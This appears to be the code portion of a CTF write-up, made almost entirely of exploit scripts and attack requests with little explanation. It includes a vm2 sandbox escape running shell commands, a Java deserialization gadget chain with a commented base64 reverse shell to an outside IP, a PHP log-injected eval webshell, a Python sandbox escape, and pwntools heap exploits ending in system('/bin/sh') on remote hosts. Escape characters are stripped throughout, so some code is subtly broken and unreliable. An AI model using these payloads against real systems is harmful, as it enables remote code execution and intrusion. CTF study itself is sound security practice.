        res.send('Success')
    }else {
        res.send("input username")
    }
})

app.post('/vm2',function  (req, res) {

    if(req.session.user && req.session.user.properties) {
        for (var i = 0; i < req.session.user.properties.length; i++)
            if (req.session.user.properties[i] == 'vm2_tester') {
                if (req.body["code"]) {
                    if (/b(?:function)b/.test(req.body["code"])) {
                        res.send("define function not allowed")
                        return;
                    }
                    if (/b(?:getPrototypeOf)b/.test(req.body["code"])) {
                        res.send("define getPrototypeOf not allowed")
                        return;
                    }
                    const vm = new VM();
                    res.send(vm.run(req.body["code"]))
                    return
                } else{
                    res.send("input code")
                }
            }
    }else{
        res.send("not vm2 tester rights")
    }

})

app.get('/', function (req, res) {
    res.send('see `/src`,use vm2 3.9.16');
});
app.get('/src', function (req, res) {
    var data = fs.readFileSync('app.js');
    res.send(data.toString());
});

app.listen(3000, function () {
    console.log('start listening on port 3000');
});
```



```
POST /vm2_tester HTTP/1.1
Host: 116.236.144.37:21928
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: connect.sid=s%3A6B0tSWAZFoLiQVGewVd20sZ34CAMCsnm.dXYZxOsZ5AtatVCZz9I7mJS9mIXN6yWn5LIQ0f4s2fg
Connection: close
Content-Type: application/json
Content-Length: 77

{
  "name":[ "vm2_tester"],
"properties":{
"length": "vm2_tester"
}
 }
```



```
POST /vm2 HTTP/1.1
Host: 116.236.144.37:21928
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: connect.sid=s%3A6B0tSWAZFoLiQVGewVd20sZ34CAMCsnm.dXYZxOsZ5AtatVCZz9I7mJS9mIXN6yWn5LIQ0f4s2fg
Connection: close
Content-Type: application/json
Content-Length: 329

{
  "code": "const err = new Error(); err.name = { toString: new Proxy(() => "", { apply(target, thiz, args) { const process = args.constructor.constructor("return process")(); throw process.mainModule.require("child_process").execSync("cat /flag").toString(); }, }), }; try { err.stack; } catch (stdout) { stdout; }"}
```



```
try to request /getflag with base64 param data. This is a springboot program without dependences.
```



```
package com.test;

import com.fasterxml.jackson.databind.node.ArrayNode;
import com.fasterxml.jackson.databind.node.BaseJsonNode;
import com.fasterxml.jackson.databind.node.POJONode;
import com.fasterxml.jackson.databind.node.ValueNode;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.*;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.ResponseEntity;
import org.springframework.web.client.RestTemplate;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URI;
import java.util.Base64;

public class App 
{
    public static void main( String[] args ) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("a");
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[]{},ctClass);
        //constructor.setBody("Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTQuMTE2LjExOS4yNTMvNzc3NyAwPiYx}|{base64,-d}|{bash,-i}");");
        constructor.setBody("Runtime.getRuntime().exec("bash -c {echo,=}|{base64,-d}|{bash,-i}");");
        ctClass.addConstructor(constructor);
        byte[] bytes = ctClass.toBytecode();
        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templatesImpl, "_name", "boogipop");
        setFieldValue(templatesImpl, "_tfactory", null);
        POJONode jsonNodes = new POJONode(templatesImpl);
        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(exp,jsonNodes);
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);
        objectOutputStream.writeObject(exp);
        FileOutputStream fout=new FileOutputStream("1.ser");
        fout.write(barr.toByteArray());
        fout.close();
        FileInputStream fileInputStream = new FileInputStream("1.ser");
        System.out.println(serial(exp));
        deserial(serial(exp));
        System.out.println(deserial(serial(exp)));
   }
    public static String serial(Object o) throws IOException, NoSuchFieldException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        //Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField("writeReplaceMethod");
        //writeReplaceMethod.setAccessible(true);
        oos.writeObject(o);
        oos.close();

        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        return base64String;

    }

    public static void deserial(String data) throws Exception {
        byte[] base64decodedBytes = Base64.getDecoder().decode(data);
        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
    }

    private static void Base64Encode(ByteArrayOutputStream bs){
        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());
        String s = new String(encode);
        System.out.println(s);
        System.out.println(s.length());
    }
    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
}
```



```
I will logged your ip+uri+input in php file , try to find something in log/958f93db977101f94b2dc1bac9ff6e2e/202305/20.php
```



```
username[<?php eval(end(getallheaders()));?>][]=1&password=5555
```



```
POST /login.php HTTP/1.1
Host: 116.236.144.37:26286
Content-Length: 63
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://116.236.144.37:26286
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://116.236.144.37:26286/1111
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

username[<?php eval(end(getallheaders()));?>][]=1&password=5555
```



```
POST /log/21f33ef71f8630f2b9ebd1a1efd24599/202305/20.php?0=ls HTTP/1.1
Host: 116.236.144.37:26286
Content-Length: 0
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Origin: http://116.236.144.37:26286
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://116.236.144.37:26286/log/21f33ef71f8630f2b9ebd1a1efd24599/202305/20.php?0=ls
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: rt_web_csrf_token=h0j4zKKzyBSFGDqlawUTxI10GY18LjuQuimHdQXjWbACnA7PiLqaGT1lR8TPrcvd; rt_web__jwt_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiNjg0NTUxYjJkMmFlYTI2N2YwN2I0ZTBlZjk3OTUzMWQiLCJ1c2VybmFtZSI6IjEzNzE3MDc2Nzk0IiwiZXhwIjoxNjg0NjMwMzQ0LCJlbWFpbCI6Im1zMTcwMTBAcXEuY29tIn0.FUUu_riV6Frl975wx4m1g7s6B1yoOY0ETyz9iKYAHBM; connect.sid=s%3AudFceoMASjtPuGXM8jsFUl6OGN8JgSx9.9xoRuuuerb2kM2Sntth3eHpw2kqEiqA7%2FiBfcRDA8Ic
Connection: close
Tao: system('cat /S3rect_1S_H3re');
```



```
#!/usr/bin/env python3

#print(''.__class__.__base__.__subclasses__())
#print(dir(''.__class__.__base__.__subclasses__()[124].__init__.__globals__['x5fx5fx62x75x69x6cx74x69x6ex73x5fx5f']['x65x76x61x6c']()))

# find flag file
print(''.__class__.__base__.__subclasses__()[124].__init__.__globals__['x5fx5fx62x75x69x6cx74x69x6ex73x5fx5f']['x65x76x61x6c'](')(daer.)"galf eman- / dnif"(nepop.)"so"(__tropmi__'[::-1]))

# read flag
print(''.__class__.__base__.__subclasses__()[118].get_data(0, "/usr/src/app/flag"))
```



```
p.sendlineafter("Input the first key: ",str((-2**63) + 0xc))
p.sendlineafter("Input the second key: ",str(1))
```



```
add(0x10,"AAAA") #chunk0 修改下面的chunk的size,改为0x431
add(0x400,"AAAA") #chunk1 将该chunk释放，进入unsorted chunk
add(0x10,"AAAAA") #chunk2 
add(0x10,"AAA") #chunk3
```



```
edit(0,p64(0)*3+p64(0x431))
dele(1)

add(0x400,"AAAA") 
add(0x10,"AAAA") # 造成堆重叠

dele(3) # 先释放chunk3
dele(2) # 再释放chunk2，这样子chunk2的位置就会有指向chunk3的指针，并且堆重叠，我们就可以泄露出来

show()
p.recvuntil("4 : ")
heap_addr = u64(p.recvuntil("n")[:-1].ljust(0x8,b"x00")) - 0x450 - 0x20 # 计算v9指向的堆块的位置
```



```
edit(4,p64(heap_addr))
add(0x10,"AAA")
add(0x10,p64(0)+p64(backdoor))
```



```
from pwn import*
context(arch='amd64', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
#libc = ELF("../libc/")
# libc = ELF("./libc-so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("116.236.144.37",24028)
    elf = ELF(name)

def add(size,content):
    p.sendlineafter("Your choice:",'2')
    p.sendlineafter("Please enter the length of the item:",str(size))
    p.sendlineafter("Please enter the name of item:",content)

def show():
    p.sendlineafter("Your choice:",'1')

def edit(idx,content):
    p.sendlineafter("Your choice:",'3')
    p.sendlineafter("Please enter the index of item:",str(idx))
    p.sendlineafter("Please enter the length of item:",str(len(content)))
    p.sendlineafter("Please enter the new name of the item:",content)

def dele(idx):
    p.sendlineafter("Your choice:",'4')
    p.sendlineafter("Please enter the index of item:",str(idx))

backdoor = 0x401765
get_p("./KeyBox")
p.sendlineafter("Input the first key: ",str((-2**63) + 0xc))
p.sendlineafter("Input the second key: ",str(1))

add(0x10,"AAAA")
add(0x400,"AAAA")
add(0x10,"AAAAA")
add(0x10,"AAA")

edit(0,p64(0)*3+p64(0x431))
dele(1)

add(0x400,"AAAA")
add(0x10,"AAAA")

dele(3)
dele(2)

show()
p.recvuntil("4 : ")
heap_addr = u64(p.recvuntil("n")[:-1].ljust(0x8,b"x00")) - 0x450 - 0x20
print(hex(heap_addr))

edit(4,p64(heap_addr))
add(0x10,"AAA")
add(0x10,p64(0)+p64(backdoor))
# gdb.attach(p,"")
p.sendlineafter("Your choice:",'5')
p.interactive()
```



```
__int64 __fastcall sub_1EC1(char *a1)
{
  sub_1E84();
  sub_13A4(a1);
  if ( !strcmp(s1, "CREATE") )
  {
    if ( !strcmp(qword_5068, "TABLE") )
    {
      if ( qword_5070 )
      {
        add_table(qword_5070);
        return 1LL;
      }
      else
      {
        puts("CREATE TABLE <TABLE_NAME>");
        return 0LL;
      }
    }
    else if ( qword_5078 && qword_5068 )
    {
      add_column((const char *)qword_5078, qword_5068);
      return 2LL;
    }
    else
    {
      puts("CREATE COLUMN FROM TABLE");
      return 0LL;
    }
  }
  else if ( !strcmp(s1, "DELETE") )
  {
    if ( !strcmp(qword_5068, "TABLE") )
    {
      if ( qword_5070 )
      {
        delete_table((__int64)qword_5070);
        return 3LL;
      }
      else
      {
        puts("DELETE TABLE <TABLE_NAME");
        return 0LL;
      }
    }
    else
    {
      strcmp(qword_5070, "FROM");
      if ( qword_5078 && qword_5068 )
      {
        delete_column(qword_5078, qword_5068);
        return 4LL;
      }
      else
      {
        puts("DELETE COLUMN FROM TABLE");
        return 0LL;
      }
    }
  }
  else if ( !strcmp(s1, "SHOW") )
  {
    if ( !strcmp(qword_5068, "TABLE") )
    {
      if ( qword_5070 )
      {
        show(qword_5070);
        return 5LL;
      }
      else
      {
        puts("SHOW TABLE <table name>");
        return 0LL;
      }
    }
    else
    {
      return 0LL;
    }
  }
  else if ( !strcmp(s1, "EDIT") )
  {
    if ( !strcmp(qword_5070, "FROM") )
    {
      if ( qword_5078 && qword_5068 )
      {
        edit((const char *)qword_5078, (__int64)qword_5068);
        return 6LL;
      }
      else
      {
        puts("EDIT COLUMN FROM TABLE");
        return 0LL;
      }
    }
    else
    {
      return 0LL;
    }
  }
  else
  {
    puts("command not found");
    return 0LL;
  }
}
```



```
struct column{
    char name[0x10];
    column* fb;
    table* belong;
    char* Field;
}
```



```
add(mode = 0,table="AAAA")
add("A","AAAA")
add(mode = 0,table="CCCC")
add(mode = 0,table="BBBB")
add("b","BBBB")
dele(mode = 0,table="CCCC")
add("b","AAAA")
```



```
dele("b","AAAA") #这里倒着释放就是为了我们后面申请回来的时候，是跟释放前的布局一样的
dele("A","AAAA")

add("A","AAAA")
add("b","AAAA")
show("AAAA")
p.recvuntil("Content: ")
heap_addr = u64(p.recvuntil("n")[:-1].ljust(8,b"x00"))
print(hex(heap_addr))
```



```
edit("A","AAAA","A"*0x10,b"A"*0xc0+p64(0)+p64(0x111)+p64(0)*2) # 将Column的fd后一位置为零
dele(table="AAAA",mode=0)
```



```
add(mode = 0,table="CCCC")
add("b","CCCC")

for i in range(7):
    add(chr(0x43+i),"BBBB")

for i in range(7):
    dele(chr(0x43+i),"BBBB")

dele(table="BBBB",mode=0)

edit("b","CCCC","b","A"*0xd0)
show("CCCC")
```



```
payload = b"A"*0x30 + p64(0) + p64(0x31) + b"A"*0x20 + p64(0)+p64(0x31) + p64(0)+b"A"*0x18 + p64(0)+p64(0x31) + b"A"*0x20 +p64(0) + p64(0x111)
edit("b","CCCC","b",payload)
```



```
add(mode = 0,table="BBBB")
for i in range(7):
    add(chr(0x43+i),"BBBB")

dele(chr(0x43+5),"BBBB")
dele(chr(0x43+6),"BBBB")
```



```
add(mode = 0,table="/bin/shx00")
add(mode = 0,table=p64(libc.sym['system']))
dele(mode = 0,table="/bin/sh")
```



```
from pwn import*
context(arch='i386', os='linux',log_level="debug")
context.terminal=["wt.exe","wsl.exe"]
libc = ELF("./libc-2.31.so")
# libc = ELF("./libc-so.6")
"""""
def xxx():
    p.sendlineafter("")
    p.sendlineafter("")
    p.sendlineafter("")
"""

def add(name = "",table = "",mode = 1):
    if mode == 0:
        if type(table) == bytes:
            p.sendafter("mysql > ",b"CREATE TABLE " + table)
        else:
            p.sendafter("mysql > ","CREATE TABLE " + table)
    else:
        p.sendafter("mysql > ","CREATE "+name + " FROM " + table)

def dele(name = "",table = "",mode = 1):
    if mode == 0:
        p.sendafter("mysql > ","DELETE TABLE " + table)
    else:
        p.sendafter("mysql > ","DELETE " + name + " FROM " + table)

def edit(name = "",table = "",content1 = "",content = "",mode = 0):
    p.sendafter("mysql > ","EDIT " + name + " FROM " + table)
    if mode == 1 :
        p.sendafter("Column name:",content1)
    else:
        p.sendafter("Column name:",content1)
        p.sendafter("Column Content: ",content)

def show(table):
    p.sendafter("mysql > ","SHOW TABLE " + table)

def get_p(name):
    global p,elf 
    # p = process(name)
    p = remote("116.236.144.37",26748)
    elf = ELF(name)

get_p("./pwn")
add(mode = 0,table="AAAA")
add("A","AAAA")
add(mode = 0,table="CCCC")
add(mode = 0,table="BBBB")
add("b","BBBB")
dele(mode = 0,table="CCCC")
add("b","AAAA")

# edit("A","AAAA","A"*0x10,b"A"*0xc0+p64(0)+p64(0x))

dele("b","AAAA")
dele("A","AAAA")

add("A","AAAA")
add("b","AAAA")
# add("b","BBBB")

show("AAAA")
p.recvuntil("Content: ")
heap_addr = u64(p.recvuntil("n")[:-1].ljust(8,b"x00"))
print(hex(heap_addr))

edit("A","AAAA","A"*0x10,b"A"*0xc0+p64(0)+p64(0x111)+p64(0)*2)
dele(table="AAAA",mode=0)

add(mode = 0,table="CCCC")
add("b","CCCC")

for i in range(7):
    add(chr(0x43+i),"BBBB")

for i in range(7):
    dele(chr(0x43+i),"BBBB")

dele(table="BBBB",mode=0)

edit("b","CCCC","b","A"*0xd0)
show("CCCC")
libc.address = u64(p.recvuntil("x7f")[-6:].ljust(8,b"x00")) - 0x10 - 96 - libc.sym['__malloc_hook']
free_hook = libc.sym['__free_hook']
print(hex(libc.address))
payload = b"A"*0x30 + p64(0) + p64(0x31) + b"A"*0x20 + p64(0)+p64(0x31) + p64(0)+b"A"*0x18 + p64(0)+p64(0x31) + b"A"*0x20 +p64(0) + p64(0x111)
edit("b","CCCC","b",payload)

add(mode = 0,table="BBBB")
for i in range(7):
    add(chr(0x43+i),"BBBB")

dele(chr(0x43+5),"BBBB")
dele(chr(0x43+6),"BBBB")
payload = b"A"*0x30 + p64(0) + p64(0x31) + b"A"*0x20 + p64(0)+p64(0x31) + p64(free_hook)
edit("b","CCCC","b",payload)

add(mode = 0,table="/bin/shx00")
add(mode = 0,table=p64(libc.sym['system']))
dele(mode = 0,table="/bin/sh")

# gdb.attach(p,"")
p.interactive()
```



```
import base64

def KSA(key):
    key_length = len(key)
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % key_length]) % 256
        S[i], S[j] = S[j], S[i]
    return S

def PRGA(S):
    i = 0
    j = 0
    while True:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) % 256]
        yield K

def RC4(key):
    S = KSA(key)
    keystream = PRGA(S)
    return keystream

if __name__ == '__main__':
    key = 'VrDQ-ffgaEig04qx'
    # 先进行 base64 解密
    Buf1 = base64.b64decode('RQpxxZgUqxzwonBuDApb3PyRJ8CcLIyXVozsVjurmPQdUdND+cly4HFq')

    key = key.encode()
    keystream = RC4(key) # 生成密钥流
    ciphertext = bytes(Buf1) # 密文流
    
    plaintext2 = bytearray()
    for b in ciphertext:
        plaintext2.append(b ^ next(keystream)) # 异或得到明文

    print(plaintext2)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/3-1685150933.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/2-1685150933.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/9-1685150934.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/5-1685150934.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/3-1685150934.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/7-1685150935.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/2-1685150935.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/9-1685150935.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/6-1685150935.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/05/10-1685150936.png)